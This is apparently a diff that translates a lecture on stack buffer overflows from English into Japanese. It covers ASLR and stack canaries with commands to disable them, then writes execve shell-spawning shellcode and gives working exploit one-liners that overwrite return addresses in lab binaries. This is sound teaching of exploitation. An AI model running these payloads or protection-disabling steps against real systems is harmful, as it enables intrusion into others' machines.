@@ -1,30 +1,22 @@
-# Lecture 2: Stack Overflows
+# Lecture 2: スタックオーバーフロー
 
-I am assuming you have been through the [Lecture 1
-handouts](/Lecture1/README.md). In that handout I have mostly explained about
-the concept of memory and stack growth. Before going on with this lecture please
-read it first.
+[Lecture 1 の資料](/Lecture1/README.md)を読み終えていることを前提にします。その資料では、主にメモリの考え方とスタックの伸び方を説明しました。この講義に進む前に、まずそちらを読んでください。
 
-In this lecture I am planning to cover the following:
-* Stack overflow.
-* Their protection mechanisms.
-    * ASLR.
-    * Stack canaries.
-* What is shell code.
-* Exploiting stack overflows and changing the control flow of the program.
+この講義では、次の内容を扱う予定です。
+* スタックオーバーフロー。
+* その防御機構。
+    * ASLR。
+    * Stack canary。
+* シェルコードとは何か。
+* スタックオーバーフローを exploit して、プログラムの制御の流れを変える。
 
 
-Let's begin.
+始めましょう。
 
-### Stack overflow.
-Programming languages such as C, in which the High level language instructions
-maps to typical machine language do not provide any mechanism to identify if
-the buffer (char array) declared on to the stack, can take the input more that
-was it was supposed to take. The reason for non-checking such sort of mechanism
-was to achieve speed par to the machine language.
+### スタックオーバーフロー
+C のように、高水準言語の命令が典型的な機械語にそのまま対応する言語には、スタック上に宣言したバッファ(char 配列)が、受け取るべき量より多い入力を受け取ってしまうかどうかを見つける仕組みがありません。そうした検査をしないのは、機械語並みの速度を得るためでした。
 
-If you remember the stack diagram from Lecture 1, this is how the stack looks
-like during the function call.
+Lecture 1 のスタックの図を覚えていれば、関数呼び出し時のスタックは次のようになっています。
 ```
                        +   Previous function  +
                        |     Stack frame      +
@@ -51,52 +43,42 @@ like during the function call.
                        +                      +
 ```
 
-Observe how the buffer is aligned in the stack. Buffers/char arrays are stored
-from lower to higher memory addresses. And also, C programs do not checks if size
-of the array is less than the input size.
-So we have these things in mind:
-* C does not check buffer overflow.
-* Buffers are stored in lower to higher memory address.
-* Just after the buffer, after overflowing it to certain amount can update saved
-* `$ebp` and return address.
-* If the return address is changed we can change the control flow. :cool:
+バッファがスタック上でどう並んでいるかを見てください。バッファ(char 配列)は、低いメモリアドレスから高いアドレスへ向かって格納されます。また、C のプログラムは、配列のサイズが入力のサイズより小さくないかを検査しません。
+そこで、次のことを覚えておきましょう。
+* C はバッファオーバーフローを検査しない。
+* バッファは低いメモリアドレスから高いアドレスへ向かって格納される。
+* バッファの直後には、ある量だけあふれさせると、保存された
+* `$ebp` と戻りアドレスを書き換えられる。
+* 戻りアドレスを変えられれば、制御の流れを変えられる。:cool:
 
-### Stack Protection
+### スタックの保護
 #### 1. ASLR
 > Address space layout randomization (ASLR) is a computer security technique
 > involved in preventing exploitation of memory corruption vulnerabilities. In
 > order to prevent an attacker from reliably jumping to, for example, a
 > particular exploited function in memory, ASLR randomly arranges the address
 > space positions of key data areas of a process, including the base of the
-> executable and the positions of the stack, heap and libraries. Ref: [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization)
+> executable and the positions of the stack, heap and libraries. 参照: [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization)
 
-In short ASLR, will keep on changing the starting address of every section will
-each run be it either heap or stack. So, ASLR will hinder our exploitation.
-What we can do for that? We will disable it. :smile:
-We will see about exploiting stack with ASLR enabled systems in future lectures.
-For now, you can disable it with this following command:
+要するに ASLR は、ヒープでもスタックでも、実行のたびに各セクションの開始アドレスを変え続けます。そのため、ASLR は exploit の妨げになります。どうすればよいでしょうか。無効にします。:smile:
+ASLR が有効なシステムでスタックを exploit する方法は、今後の講義で扱います。
+今のところは、次のコマンドで無効にできます。
 `echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space`
 
-#### 2. Stack Canaries
+#### 2. Stack Canary
 >Stack canaries, named for their analogy to a canary in a coal mine, are used to
 >detect a stack buffer overflow before execution of malicious code can occur.
 >This method works by placing a small integer, the value of which is randomly
->chosen at program start, in memory just before the stack return pointer. Ref:(link)[https://en.wikipedia.org/wiki/Stack\_buffer\_overflow#Stack\_canaries]
+>chosen at program start, in memory just before the stack return pointer. 参照: (link)[https://en.wikipedia.org/wiki/Stack\_buffer\_overflow#Stack\_canaries]
 
-This means they just protect your buffers. This is technique implemented by the
-compiler to incorporate some random data after the end of buffer in the program
-that will allow system to identify the buffer overflows.
-For now we will disable that option from the compiler using following option.
+つまり、これはバッファを守るだけのものです。コンパイラが実装している手法で、プログラム中のバッファの末尾の後ろにランダムなデータを入れておき、システムがバッファオーバーフローを見つけられるようにします。
+今のところは、次のコンパイラオプションでこの機能を無効にします。
 `gcc -fno-stackprotector <file>.c`
 
-### Shell Codes
-Shell is small piece of payload in binary language that is used to inject to
-vulnerable binary files. You can craft the payload for anything. They are just
-module level binary code.
-Crafting shellcode is in itself a big topic to cover here. I shall take it in
-brief. We will create a shellcode that spawns a shell. First create
-shellcode.nasm with the following content.
-[In detail](http://www.vividmachines.com/shellcode/shellcode.html)
+### シェルコード
+シェルコード(Shell code)は、脆弱なバイナリに注入するために使う、バイナリ形式の小さなペイロードです。ペイロードは何のためにでも作れます。単なるモジュール単位のバイナリコードです。
+シェルコードの作成はそれだけで大きなテーマなので、ここでは簡単に扱います。シェルを起動するシェルコードを作ります。まず、次の内容で shellcode.nasm を作ってください。
+[詳しくはこちら](http://www.vividmachines.com/shellcode/shellcode.html)
 
 ```
 xor     eax, eax    ;Clearing eax register
@@ -113,14 +95,13 @@ mov     al, 11      ;syscall number of execve is 11
 int     0x80        ;Make the system call
 ```
 
-Use `nasm` to compile it.
+`nasm` でコンパイルします。
 `nasm -f elf shellcode.asm`
 
-Now you would want to obtain the shell code bytes. What are they? They are
-machine code that corresponds to those instructions.
-How can we get those? `objdump` will help.
+次に、シェルコードのバイト列を取り出したくなるでしょう。それは何かというと、これらの命令に対応する機械語です。
+どうやって取り出すのでしょうか。`objdump` が役に立ちます。
 `objdump -d shellcode.o`
-You will get something like.
+次のような出力が得られます。
 ```
 shellcode.o:     file format elf32-i386
 Disassembly of section .text:
@@ -138,13 +119,13 @@ Disassembly of section .text:
   15:    b0 0b                    mov    $0xb,%al
   17:    cd 80                    int    $0x80
 ```
-You can use the following shell code to get that extracted. :cool:
+次のシェルスクリプトで、それを抽出できます。:cool:
 ``for i in `objdump -d shellcode.o | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done``
 
-Exploiting actual programs:
+実際のプログラムを exploit する:
 ---
 
-#### 1. Lets consider this code.
+#### 1. 次のコードを考えます
 ```c
 #include <stdio.h>
 
@@ -166,9 +147,9 @@ int main()
     return 0;
 }
 ```
-The task is to change the control flow so that `bar` function is called.
-Lets start doing it. Compilation instruction is there in the file.
-Identify the buffer location and how far is $ebp from it.
+課題は、制御の流れを変えて `bar` 関数を呼び出させることです。
+始めましょう。コンパイルの手順はファイルの中にあります。
+バッファの位置と、そこから $ebp までの距離を特定します。
 `objdump -d ./first`
 ```
 0804848b <bar>:
@@ -207,7 +188,7 @@ Identify the buffer location and how far is $ebp from it.
 
 ```
 
-Notice these instruction in `foo`
+`foo` の次の命令に注目してください
 ```
  80484ad:    8d 45 ee                 lea    -0x12(%ebp),%eax
  80484b0:    50                       push   %eax
@@ -215,13 +196,13 @@ Notice these instruction in `foo`
  80484b6:    e8 b5 fe ff ff           call   8048370 <__isoc99_scanf@plt>
 ```
 
-The value of 0x12 is subtracted from `$ebp` and is then pushed to stack for call to `scanf`.
-We know that one of them is nothing but buffer that scanf inputs.
-This must be the buffer that needs to inject. base16(12) == base10(18). Our buffer is 18 bytes from `$ebp`.
+`$ebp` から 0x12 を引いた値が、`scanf` の呼び出しのためにスタックへ push されています。
+そのうちの1つは、scanf が入力を書き込むバッファにほかなりません。
+これが、注入の対象となるバッファのはずです。base16(12) == base10(18) なので、バッファは `$ebp` から18バイトの位置にあります。
 
-Finally we are ready to craft the payload.
+これでようやく、ペイロードを作る準備ができました。
 ``echo -e `python -c 'print "A"*18+<Dummay valur for EBP>+<Return address>'` | ./first ``
-The exact payload looks like:
+実際のペイロードは次のようになります。
 ``echo -e `python -c 'import struct;print "A"*18+"BBBB"+struct.pack("<I", 0x0804848b )'` | ./first ``
 
 ```
@@ -230,15 +211,14 @@ How come you entered into bar ?
 Segmentation fault (core dumped)
 ```
 
-:smile: we exploited the buffer overflow.
+:smile: バッファオーバーフローを exploit できました。
 
-#### Try to solve exploit\_me\_2.c `Shellcode injection` :smile:
-* Diable ASLR.
-* Find the starting address of the buffer using GDB.
-* Over flow stack in such a way that return address is starting address of the
-buffer.
-* The buffer should contain the shellcode.
-The exploit might look like this:
+#### exploit\_me\_2.c `Shellcode injection` を解いてみましょう :smile:
+* ASLR を無効にします。
+* GDB を使って、バッファの開始アドレスを調べます。
+* 戻りアドレスがバッファの開始アドレスになるように、スタックをあふれさせます。
+* バッファにはシェルコードを入れておきます。
+exploit は次のようになるでしょう。
 ```bash
 ./second `python -c 'import struct;shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; bufferlen=108; print shellcode+"\x90"*(bufferlen-len(shellcode))+"BBBB"+struct.pack("<I", starting address of the buffer)'`
 ```
